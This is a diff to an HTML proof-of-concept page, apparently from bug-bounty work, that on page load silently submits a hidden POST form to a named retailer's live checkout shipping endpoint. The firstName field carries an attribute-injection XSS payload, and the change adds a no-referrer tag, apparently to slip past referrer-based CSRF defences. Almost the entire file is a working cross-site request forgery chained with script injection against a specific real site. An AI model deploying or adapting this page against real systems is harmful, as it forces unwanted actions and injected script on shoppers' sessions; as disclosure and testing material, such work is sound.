@@ -1,23 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CSRF PoC</title>
   <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer">
+  <title>CSRF PoC</title>
 </head>
 <body onload="document.getElementById('csrfForm').submit();">
   <form id="csrfForm"
         action="https://ae.loccitane.com/on/demandware.store/Sites-Loccitane_AE-Site/en_AE/CheckoutShippingServices-UpdateShippingMethodsList"
         method="POST"
         enctype="application/x-www-form-urlencoded">
-    <input type="hidden" name="title" value="Mr">
-    <input type="hidden" name="firstName" value='kadalfaiz" onfocus="print(0)'>
-    <input type="hidden" name="lastName" value="ddfd">
-    <input type="hidden" name="address1" value="dffdfd">
-    <input type="hidden" name="address2" value="Dhaid">
-    <input type="hidden" name="city" value="Dhaid">
-    <input type="hidden" name="phone" value="544334343">
+
+    <input type="hidden" name="title"     value="Mr">
+    <input type="hidden" name="firstName" value='kadalfaiz"+onfocus="print(0)'>
+    <input type="hidden" name="lastName"  value="ddfd">
+    <input type="hidden" name="address1"  value="dffdfd">
+    <input type="hidden" name="address2"  value="Dhaid">
+    <input type="hidden" name="city"      value="Dhaid">
+    <input type="hidden" name="phone"     value="544334343">
     <input type="hidden" name="phoneCode" value="+971">
-    <input type="hidden" name="storeID" value="">
+    <input type="hidden" name="storeID"   value="">
+
   </form>
 </body>
 </html>
